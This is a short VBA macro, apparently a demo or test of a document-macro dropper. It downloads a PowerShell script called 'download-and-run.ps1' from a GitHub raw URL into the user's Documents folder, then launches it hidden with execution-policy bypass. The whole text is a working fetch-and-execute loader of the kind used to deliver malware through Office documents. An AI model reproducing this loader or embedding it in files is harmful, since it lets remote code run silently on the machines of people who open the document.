Sub Demo()
' main entry
    Dim fileURL As String, saveLocation As String
    Dim RetVal
    Dim User, UserDocPath As String
    
    User = Environ("USERNAME")
    UserDocPath = "/Users/" & User & "/Documents/"
    saveLocation = UserDocPath & "testfile.ps1"
    fileURL = "https://raw.githubusercontent.com/turvas/ps_test/master/download-and-run.ps1"

    DownloadFile fileURL, saveLocation

    RetVal = Shell("powershell -executionpolicy bypass -noexit -file " & saveLocation, vbHide)
 
End Sub

Sub DownloadFile(url As String, filePath As String)

    Dim WinHttpReq As Object, attempts As Integer
    attempts = 3
    On Error GoTo TryAgain
TryAgain:
    attempts = attempts - 1
    Err.Clear
    If attempts > 0 Then
        Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
        WinHttpReq.Open "GET", url, False
        WinHttpReq.send

        If WinHttpReq.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write WinHttpReq.responseBody
            oStream.SaveToFile filePath, 2 ' 1 = no overwrite, 2 = overwrite
            oStream.Close
        End If
    End If
End Sub

